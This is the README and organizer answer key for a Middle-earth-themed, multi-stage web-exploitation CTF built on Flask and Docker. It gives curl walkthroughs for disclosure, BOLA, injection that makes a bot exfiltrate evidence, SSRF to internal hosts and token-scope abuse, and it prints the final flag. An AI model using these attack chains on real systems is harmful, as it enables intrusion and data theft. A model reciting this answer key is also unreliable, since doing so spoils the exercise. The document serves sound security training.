# The One Wiki — Archives of Middle-earth
### Expert-tier, multi-stage web exploitation CTF (Flask / Docker Compose)

Fully dockerized, end-to-end tested. One published service (`wiki`, port
5000); everything else lives on an internal Docker network and is only
reachable by pivoting through the wiki's own features — exactly as the
design doc specified.

---

## 1. Quick start

```bash
docker compose up --build
```

Then open **http://localhost:5000**.

No other ports are published. `review-service`, `import-service`,
`conversion-worker`, and `archive-service` are only reachable from inside
the `ctf-net` Docker network — which is the point.

Seed credentials (also shown on the login page):

| Username | Password | Role |
|---|---|---|
| `scholar1` | `scholar123` | scholar (the account players are "granted") |
| `archivist1` | `archivist456` | archivist (flavor only — not required to solve) |

`librarian-of-moria` exists but has no usable password — its existence
is something players *discover*, not an account they log into.

All data is deterministic and in-memory; `docker compose down && docker
compose up` gives every team an identical, reset environment.

---

## 2. Architecture

```
                         ┌─────────────┐
   Players ───────────▶  │    wiki      │  (published: 5000)
                         │ (public)     │
                         └──────┬───────┘
                                │ enqueues edits
                                ▼
                         ┌─────────────┐
                         │ review-      │  internal only
                         │ service      │  (privileged bot)
                         └──────┬───────┘
                                │ (bot, once tricked)
                                ▼ relays evidence back to wiki /dropbox
                         ┌─────────────┐
   wiki delegates  ────▶ │ import-      │  internal only
   "import citation"     │ service      │  <-- THE ONLY SSRF PIVOT POINT
                         └──────┬───────┘
                                │ fetches arbitrary internal URLs
                     ┌──────────┴──────────┐
                     ▼                     ▼
             ┌───────────────┐     ┌───────────────┐
             │ conversion-    │     │ archive-       │  internal only,
             │ worker         │────▶│ service        │  most restricted,
             │ internal only  │     │                │  holds final record
             └───────────────┘     └───────────────┘
```

**Players never get direct network access to anything but `wiki`.** Every
later-stage service is reached *through* a legitimate wiki feature being
abused (the edit/review queue, or the citation importer). This is what
makes "only reachable from inside the network" a real constraint instead
of a fiction — `docker-compose.yml` genuinely publishes no other ports.

---

## 3. The one underlying design flaw

Every stage is a different symptom of the same root cause (stated plainly
for organizers; players are meant to reconstruct this themselves):

> **The system trusts self-reported provenance metadata (flags, names,
> signed-looking assertions) more than it verifies the identity actually
> making a request, and nothing binds a credential to the specific
> operation it was meant for.**

Concretely:
- Stage 2: a revision's `status` field is trusted implicitly by `/wiki/<slug>`
  but never re-checked by `/api/revision/<id>`.
- Stage 3: the *preview* renderer trusts markup the *public* renderer
  correctly treats as unsafe.
- Stage 5: `conversion-worker` trusts a self-reported `source_verified`
  boolean with zero cryptographic backing to decide whether to hand out a
  real signed assertion.
- Stage 6: `archive-service` checks that an assertion is *signed* and that
  its `service`/`role` are allow-listed — but never checks `issued_for`
  (the operation it was actually issued for) against the operation being
  requested. A `convert`-scoped token works for `release`.
- Stage 7: ownership binding on the final record is simply absent (`owner_legacy_id
  = None`), so whatever a release token claims is accepted unchecked.
- Even the shared `ARCHIVE_SIGNING_SECRET` between `conversion-worker` and
  `archive-service` is one more instance of the same mistake: there's no
  per-service key, just one secret everyone trusts.

---

## 4. Stage-by-stage solution (for organizers / verification)

All seven stages were verified end-to-end against a running instance.
Every step below goes *through* `wiki` at `localhost:5000` — nothing here
requires direct access to any internal service.

### Stage 1 — The Forgotten Age (info disclosure)
```bash
curl http://localhost:5000/static/js/app.js.map        # leaks legacy_id 1007 -> The-Seven-Gates
curl http://localhost:5000/legacy/export/1007           # confirms slug
curl http://localhost:5000/wiki/The-Seven-Gates          # FLAG 1
```

### Stage 2 — The Palantír (BOLA)
```bash
curl http://localhost:5000/wiki/Isildur/history          # -> rev-a3f9c2 (public), rev-a3f9c1 (?)
curl http://localhost:5000/api/revision/rev-a3f9c1        # FLAG 2 + reveals "librarian-of-moria"
```
`/api/revision/<id>` checks that the referenced *page* exists but never
checks whether *this revision* is `restricted` or who is asking.

### Stage 3 — The Whispering Archive (stored injection → privileged bot)
```bash
curl -c cj.txt -X POST http://localhost:5000/login -d "username=scholar1&password=scholar123"

curl -b cj.txt -X POST http://localhost:5000/edit/Isildur \
  --data-urlencode "content=Minor correction. [[exfil:http://localhost:5000/dropbox/box1]]"
# -> {"rev_id": "pend-XXXXXXXX", ...}

sleep 8     # the bot's "strict review schedule" (6s) must elapse
curl http://localhost:5000/review-status/pend-XXXXXXXX
curl http://localhost:5000/dropbox/box1     # FLAG 3 + evidence_token + "palantir-renderer"
```
The **public** renderer strips `[[exfil:...]]` entirely (confirm with
`curl http://localhost:5000/wiki/Isildur`), but the **bot's preview
renderer** executes it: it fetches its own privileged `/internal/evidence`
and relays the result to whatever URL the attacker supplied.

### Stage 4 — The Doors of Durin (SSRF)
```bash
curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://archive-service:5004/internal/manifest-hint"
# -> FLAG 4

curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://archive-service:5004/internal/full-manifest?evidence_token=<FROM_STAGE_3>"
# -> restricted_service_id + conversion-worker hint
```
`import-service`'s URL "policy" is a denylist of loopback/metadata
strings — it never allowlists only the public lore domain, so any
Docker-internal hostname sails through.

### Stage 5 — The Mines of Moria (unsafe document processing)
```bash
curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://conversion-worker:5003/diagnostics"
# -> reveals `source_verified` is the trust flag conversion checks

curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://conversion-worker:5003/convert?legacy_id=1007&format=legacy-v1&source_verified=true&content=hello"
# -> FLAG 5 + a real, validly-signed worker_token (base64)
```

### Stage 6 — The Black Gate (confused deputy)
```bash
curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://archive-service:5004/archive/operation?assertion_token=<WORKER_TOKEN>&op=release&record_id=The-Last-Archive"
# -> FLAG 6 + release_token
```
The worker token was only ever `issued_for: "convert"` — `archive-service`
never checks that field against the requested `op`, so a `convert`-scoped
credential is honored for `release`.

### Stage 7 — Mount Doom (final record)
```bash
curl -b cj.txt -X POST http://localhost:5000/import_citation \
  --data-urlencode "url=http://archive-service:5004/archive/record/The-Last-Archive?release_token=<RELEASE_TOKEN>"
# -> FINAL FLAG
```
`The-Last-Archive`'s `owner_legacy_id` is `None` (never properly
re-archived after migration), so ownership is never checked — the release
token's claims are trusted outright.

---

## 5. Anti-brute-force properties (as designed)

- All sensitive identifiers (`rev-a3f9c1`, tokens, secrets) are
  non-sequential and opaque; nothing here is guessable by iteration.
- Every stage yields exactly one missing piece, never the next endpoint
  outright (e.g. Stage 4's `manifest-hint` names `conversion-worker` only
  conceptually via `/diagnostics`'s own disclosure — stage 4 itself never
  tells you the exact exploitable query string for stage 5).
- The final record requires evidence chained from Stages 3, 5, and 6
  simultaneously (`evidence_token`, `worker_token`, `release_token`) —
  no single stage shortcuts to the final flag.
- Decoy surface: `/old-docs/`, the unused `[[b:...]]` markup tag, and
  `rev-a3f9c2` (the ordinary public revision) are all real but
  non-exploitable — they teach the two-renderer / two-ID-system
  distinction without being part of the critical path.
- Server-side logging: each service logs to stdout (visible via `docker
  compose logs -f <service>`), so organizers can see exactly which stage a
  team is stuck on.

---

## 6. Player-facing briefing

> FELLOW SCHOLAR,
>
> The archives of Middle-earth are no longer trustworthy.
>
> An entry has been altered. A revision has disappeared. The librarians
> deny having accessed the restricted collections, yet the index contains
> references to records that should not exist.
>
> The Council believes someone has found a way to turn the archive's own
> mechanisms against it.
>
> You have been granted a standard scholar account. No additional
> privileges will be provided.
>
> Follow the revisions. Trust no metadata. Remember that even the
> smallest passage may conceal a greater design.
>
> One Wiki. Three Ages. One Ring.
>
> — Mithrandir, Office of Restricted Knowledge

Give players only: the URL, the scholar1/scholar123 credentials, and the
briefing above. Everything else is meant to be discovered.

---

## 7. Flags

Flags are deterministic per-stage SHA-256-derived strings (format
`LOTR{stage_<hash>}` / `LOTR{final_<hash>}`), generated fresh each time you
change `FLAG_PREFIX` or the seed strings in each service's `app.py` — swap
`FLAG_PREFIX` in `docker-compose.yml` if you want a different namespace
for your CTF platform.

### The final gate — `/flag`

Once a player has collected all seven stage flags, they submit them together
to the wiki's `POST /flag` endpoint. If every flag is present exactly once
(order does not matter), the endpoint reveals the "real" event flag:

```bash
curl -X POST http://localhost:7000/flag \
  -H 'Content-Type: application/json' \
  -d '{"flags":["<stage1>","<stage2>","<stage3>","<stage4>","<stage5>","<stage6>","<stage7>"]}'
# -> {"status":"correct", "flag":"GCDxGLORY{Th3_0ne_R1nG_Rul3_Th3m_4LL}"}
```

Browsers get an HTML form at `GET /flag`, linked from the wiki index, with
seven labeled fields and inline success/error feedback. `GET /flag` with an
`Accept: application/json` header (or `?format=json`) returns usage
instructions as JSON. Form submissions also work, either as
`flag1=...&...&flag7=...` or as repeated `flags=` values (newline- or
comma-separated), and render the HTML result page. The real flag defaults to
`GCDxGLORY{Th3_0ne_R1nG_Rul3_Th3m_4LL}` and can be changed per event with
the `REAL_FLAG` environment variable on the `wiki` service.

## 8. Resetting between teams / rounds

Everything is in-memory by design (no volumes), so:
```bash
docker compose down && docker compose up --build
```
gives a byte-identical fresh environment every time.
